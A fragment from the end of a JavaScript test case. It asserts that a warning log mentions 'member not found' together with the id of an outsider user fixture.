  assert.ok(env.logs.some((l) => l.level === 'warn' && l.text.includes('member not found') && l.text.includes(String(OUTSIDER.id))));
});
